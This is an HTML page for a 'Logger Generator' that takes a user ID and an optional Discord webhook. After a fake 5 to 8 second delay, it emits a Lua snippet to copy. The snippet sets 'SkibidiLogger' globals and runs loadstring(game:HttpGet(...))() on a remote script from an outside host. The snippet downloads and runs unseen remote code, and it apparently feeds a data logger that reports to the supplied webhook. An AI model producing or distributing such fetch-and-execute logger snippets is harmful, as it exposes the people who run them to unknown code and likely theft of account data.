<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logger Generator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Fira+Code:wght@400;500&display=swap');
        
        body {
            background-color: #0a0a0c;
            font-family: 'Inter', sans-serif;
            color: #e2e8f0;
            cursor: default !important;
        }

        .pop-in {
            animation: popIn 0.5s cubic-bezier(0.26, 0.53, 0.74, 1.48) forwards;
        }

        @keyframes popIn {
            0% { opacity: 0; transform: scale(0.9) translateY(20px); }
            100% { opacity: 1; transform: scale(1) translateY(0); }
        }

        .purple-glow {
            box-shadow: 0 0 25px rgba(139, 92, 246, 0.1);
        }

        input {
            background: #16161e;
            border: 1px solid #2d2d3d;
            cursor: default !important;
        }

        input:focus {
            outline: none;
            border-color: #8b5cf6;
            box-shadow: 0 0 0 2px rgba(139, 92, 246, 0.2);
        }

        .loader {
            border: 2px solid #2d2d3d;
            border-top: 2px solid #8b5cf6;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        button {
            cursor: default !important;
            transition: all 0.2s ease;
        }

        #outputCode {
            scrollbar-width: thin;
            scrollbar-color: #2d2d3d #050507;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-6">

    <div class="pop-in w-full max-w-md bg-[#11111a] p-8 rounded-2xl border border-[#2d2d3d] purple-glow">
        <h1 class="text-2xl font-bold text-white mb-6 text-center tracking-tight">Logger Generator</h1>
        
        <div class="space-y-4">
            <div>
                <label class="block text-sm font-medium text-gray-400 mb-1">User ID</label>
                <input type="text" id="userId" placeholder="Enter ID..." class="w-full p-3 rounded-lg text-white">
            </div>

            <div>
                <label class="block text-sm font-medium text-gray-400 mb-1">Webhook (not required)</label>
                <input type="text" id="webhook" placeholder="Discord Webhook URL..." class="w-full p-3 rounded-lg text-white">
            </div>

            <div class="flex items-center gap-4 pt-2">
                <button id="generateBtn" onclick="generate()" class="flex-1 bg-violet-600 hover:bg-violet-700 text-white font-bold py-3 rounded-lg">
                    GENERATE
                </button>
                <div id="loading" class="hidden loader"></div>
            </div>
        </div>

        <div id="resultBox" class="hidden mt-8 pt-6 border-t border-[#2d2d3d] pop-in">
            <div class="flex items-center justify-between mb-3">
                <h2 class="text-lg font-semibold text-white">Generated!</h2>
                <button id="copyBtn" onclick="copyToClipboard()" class="p-2 hover:bg-[#1d1d2b] rounded-md text-gray-400 hover:text-white">
                    <i id="copyIcon" data-lucide="copy" class="w-5 h-5"></i>
                </button>
            </div>
            <div class="relative">
                <pre id="outputCode" class="bg-[#050507] p-4 rounded-lg text-[11px] font-mono text-violet-300 overflow-x-auto border border-[#1e1e2e] leading-relaxed"></pre>
            </div>
        </div>
    </div>

    <script>
        // Initialize Icons
        lucide.createIcons();

        function generate() {
            const btn = document.getElementById('generateBtn');
            const loader = document.getElementById('loading');
            const resultBox = document.getElementById('resultBox');
            const output = document.getElementById('outputCode');

            const userId = document.getElementById('userId').value || "";
            const webhook = document.getElementById('webhook').value || "";

            resultBox.classList.add('hidden');
            loader.classList.remove('hidden');
            btn.style.opacity = "0.5";

            // Random delay 5-8 seconds
            const delay = Math.floor(Math.random() * (8000 - 5000 + 1)) + 5000;

            setTimeout(() => {
                const script = `getgenv().SkibidiLogger_USERID = "${userId}" -- your user id here
getgenv().SkibidiLogger_WEBHOOK = "${webhook}" -- your discord webhook here, blank if you don't want to get messages

loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/18291063f87ad7562ffd1bdccac707dfd91e417f4df57478192ca9f2286bb626/download"))()`;

                output.textContent = script;
                loader.classList.add('hidden');
                resultBox.classList.remove('hidden');
                btn.style.opacity = "1";
            }, delay);
        }

        function copyToClipboard() {
            const text = document.getElementById('outputCode').textContent;
            const copyIcon = document.getElementById('copyIcon');
            
            navigator.clipboard.writeText(text).then(() => {
                // Change icon to checkmark
                copyIcon.setAttribute('data-lucide', 'check');
                copyIcon.classList.add('text-green-400');
                lucide.createIcons();

                // Revert back after 2 seconds
                setTimeout(() => {
                    copyIcon.setAttribute('data-lucide', 'copy');
                    copyIcon.classList.remove('text-green-400');
                    lucide.createIcons();
                }, 2000);
            });
        }
    </script>
</body>
</html>
